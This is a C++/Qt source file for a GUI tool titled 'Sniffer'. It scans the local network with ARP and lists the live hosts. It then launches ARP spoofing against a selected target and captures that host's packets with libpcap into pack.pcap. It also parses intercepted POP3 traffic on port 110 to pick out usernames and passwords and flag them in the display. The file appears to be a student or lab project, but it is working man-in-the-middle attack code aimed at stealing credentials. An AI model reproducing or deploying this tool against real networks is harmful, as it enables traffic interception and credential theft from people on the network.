#include "widget.h"
#include "ui_widget.h"
#include "globle.h"
#include "arp.h"
ARP arp;
Widget::Widget(QWidget *parent)
    : QWidget(parent)
    , ui(new Ui::Widget)
{
    ui->setupUi(this);
    this->setWindowTitle("Sniffer");
}

Widget::~Widget()
{
    delete ui;
}

QString Widget::gettimestr(){
    QTime T;
    T=QTime::currentTime();
    QString qtime=QString("%1:%2:%3").arg(T.hour()).arg(T.minute()).arg(T.second());
    return qtime;
}

void Widget::host_button_clicked(char *ip){
    ui->target->setText(ip);
//    arp.arpspoof(ip);
}

void Widget::on_scanstart_clicked()
{
    pcap_flag=1;
    ui->status->append(QString("%1\tarp scan...\n").arg(gettimestr()));
    QApplication::processEvents();
    printf("=================you are in slot of scanstart_click=============\n");
    //get src, gateway, netmask
    QString tmpstr;
    char *tmpptr;
    memset(netmask_str,0,16);
    memset(gateway_str,0,16);
    memset(device,0,16);
    tmpstr=ui->netmask->text();
    tmpptr=tmpstr.toLatin1().data();
    memcpy(netmask_str,tmpptr,strlen(tmpptr));
    tmpstr=ui->gateway->text();
    tmpptr=tmpstr.toLatin1().data();
    memcpy(gateway_str,tmpptr,strlen(tmpptr));
    tmpstr=ui->device->text();
    tmpptr=tmpstr.toLatin1().data();
    memcpy(device,tmpptr,strlen(tmpptr));
    printf("netmask=%s\ngateway=%s\ndevice=%s\n",netmask_str,gateway_str,device);
    //arpscan
    arp.arpscan();
    QPushButton *host_button;
    int j=0;
//    QScrollArea *scrollArea=new QScrollArea(ui->widget_4);
//    scrollArea->setGeometry(0,29,300,300);
//    QWidget *scrollAreaWidgetContents=new QWidget();
    for(int i=0;i<net_size;i++){
        if(hosts[i].up==1){
            printf("ip=%s\n",hosts[i].ip);
            QString text=hosts[i].ip;
            host_button = new QPushButton(ui->scrollAreaWidgetContents);
            host_button->setText(text);
            host_button->setGeometry(40,j*40+10,200,30);
            j++;
            ui->scrollAreaWidgetContents->setGeometry(0,0,ui->scrollArea->width()-20,j*40+20);
            connect(host_button, &QPushButton::clicked, [=] { host_button_clicked(hosts[i].ip); });
            host_button->show();
            QApplication::processEvents();
        }
    }
//    scrollArea->setWidget(scrollAreaWidgetContents);
//    scrollArea->show();
    ui->status->append(QString("%1\tget hosts list...\n").arg(gettimestr()));
}

void Widget::on_clear_clicked()
{
    ui->status->append(QString("%1\tclear all data...\n").arg(gettimestr()));
    ui->status->clear();
    ui->device->clear();
    ui->gateway->clear();
    ui->netmask->clear();
    ui->target->clear();
    ui->filter->clear();
    ui->treeWidget->clear();
    QList<QPushButton*> buttons=ui->scrollAreaWidgetContents->findChildren<QPushButton*>();
    foreach(QPushButton*btn,buttons){
        btn->deleteLater();
    }
    Globle G;
    G.reset_all();
    printf("clear success...\n");
}

void Widget::on_start_clicked()
{
    spoof_flag=1;
    pktsn_flag=1;
    id=0;
    ui->status->append(QString("%1\tstart arp spoof and packet sniff...\n").arg(gettimestr()));
    memset(target_str,0,16);
    memset(filter_str,0,50);
    QString tmpstr;
    char *tmpptr;
    tmpstr=ui->target->text();
    tmpptr=tmpstr.toLatin1().data();
    memcpy(target_str,tmpptr,strlen(tmpptr));
    tmpstr=ui->filter->text();
    tmpptr=tmpstr.toLatin1().data();
    memcpy(filter_str,tmpptr,strlen(tmpptr));
    arp.startsnsp();
    pkt_sniff();
}

void Widget::on_stop_clicked()
{
    ui->status->append(QString("%1\tstop arp spoof and packet sniff...\n").arg(gettimestr()));
    spoof_flag=0;
    pktsn_flag=0;
}

void getmac(u_char * umac,char * cmac){
    memset(cmac,0,18);
    sprintf(cmac,"%02x:%02x:%02x:%02x:%02x:%02x",umac[0],umac[1],umac[2],umac[3],umac[4],umac[5]);
    printf("get mac:%s\n",cmac);
}

void getip(unsigned int uip,char * cip){
    memset(cip,0,16);
    struct in_addr addr;
    addr.s_addr=uip;
    sprintf(cip,"%s",inet_ntoa(addr));
    printf("get ip:%s\n",cip);
}

void Widget::pkt_sniff(){
    printf("============you are in pktsn_thread============\n");
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    pcap_t * handle=pcap_open_live(device,512,1,1000,errbuf);
    pcap_compile(handle,&fp,filter_str,0,0);
    if (pcap_setfilter(handle, &fp) !=0) {
        pcap_perror(handle, "Error in setfilter:");
        exit(-1);
    }
    printf("start sniffing with fliter:%s...\n",filter_str);
    pcap_dumper_t* out_pcap;
    out_pcap=pcap_dump_open(handle,"pack.pcap");
    int res;//0->timeout
    struct pcap_pkthdr *header;
    const u_char *packet;
    while ((res = pcap_next_ex(handle, &header, &packet)) >= 0 && (pktsn_flag==1)){
        printf("\n=============got packet in pktsniff==================\n");
        pcap_dump((u_char *)out_pcap, header, packet);
        pkt_analyze(header,packet);
    }
    printf("stop packet sniff\n");
    pcap_dump_close(out_pcap);
    pcap_close(handle);
}

void Widget::pkt_analyze(const struct pcap_pkthdr* header,const u_char* pkt_data){
    // top for id,time,sensitive
    QTreeWidgetItem * top = new QTreeWidgetItem(QStringList()<<QString("%1").arg(id++)<<gettimestr());
    ui->treeWidget->addTopLevelItem(top);
    // eth
    if(header->len < sizeof(ETHHEADER)) return;
    QTreeWidgetItem * eth_item = new QTreeWidgetItem(QStringList()<<"Physical Layer"<<"ETHERNET");
    top->addChild(eth_item);
    ETHHEADER *eptr=(ETHHEADER*) pkt_data;
    char mac[18];
    getmac(eptr->DestMac,mac);
    QTreeWidgetItem * eth_dst_item = new QTreeWidgetItem(QStringList()<<"Destination MAC"<<mac);
    eth_item->addChild(eth_dst_item);
    getmac(eptr->SrcMac,mac);
    QTreeWidgetItem * eth_src_item = new QTreeWidgetItem(QStringList()<<"Source MAC"<<mac);
    eth_item->addChild(eth_src_item);
    // ip
    IPHEADER *pIpheader=(IPHEADER*)(pkt_data+sizeof(ETHHEADER));
    QTreeWidgetItem * ip_item = new QTreeWidgetItem(QStringList()<<"Network Layer"<<"IP");
    top->addChild(ip_item);
    char ip[16];
    getip(pIpheader->destIP,ip);
    QTreeWidgetItem * ip_dst_item = new QTreeWidgetItem(QStringList()<<"Destination IP"<<QString("%1").arg(ip));
    ip_item->addChild(ip_dst_item);
    getip(pIpheader->sourceIP,ip);
    QTreeWidgetItem * ip_src_item = new QTreeWidgetItem(QStringList()<<"Source IP"<<QString("%1").arg(ip));
    ip_item->addChild(ip_src_item);
    if(pIpheader->proto!=6) return;
    // tcp
    TCPHEADER *pTcpheader = (TCPHEADER*)(pkt_data + sizeof(ETHHEADER) + sizeof(IPHEADER));
    QTreeWidgetItem * tcp_item = new QTreeWidgetItem(QStringList()<<"Transport Layer"<<"TCP");
    top->addChild(tcp_item);
    int sport=(int)ntohs(pTcpheader->sport);
    int dport=(int)ntohs(pTcpheader->dport);
    QTreeWidgetItem * tcp_dst_item=new QTreeWidgetItem(QStringList()<<"Destination Port"<<QString("%1").arg(dport));
    tcp_item->addChild(tcp_dst_item);
    QTreeWidgetItem * tcp_src_item=new QTreeWidgetItem(QStringList()<<"Source Port"<<QString("%1").arg(sport));
    tcp_item->addChild(tcp_src_item);
    // find data in application
    int off;
    char * datatcp;
    off = sizeof(IPHEADER) + sizeof(TCPHEADER) + sizeof(ETHHEADER);
    datatcp = ( char *)pkt_data + off;
    int ret=0;
    if(sport==110||dport==110){
        QTreeWidgetItem * app_item = new QTreeWidgetItem(QStringList()<<"Application Layer"<<"POP");
        top->addChild(app_item);
        char info[100];
        ret=arp.findPOPPasswd(datatcp, header->len-off,info);
        if(ret==1){
            top->setText(2,"username");
        }else if(ret==2){
            top->setText(2,"password");
        }
        QTreeWidgetItem * app_data_item = new QTreeWidgetItem(QStringList()<<QString("%1").arg(info));
        app_item->addChild(app_data_item);
    }
    QApplication::processEvents();
}

void Widget::analyze_append(){
    printf("\ngot analyze data in qt\n");
    printf("%s\n",pktinfo);
//    ui->analyze->insertPlainText(QString("%1\n").arg(pktinfo));
//    QApplication::processEvents();
}

void Widget::on_test_clicked()
{

}
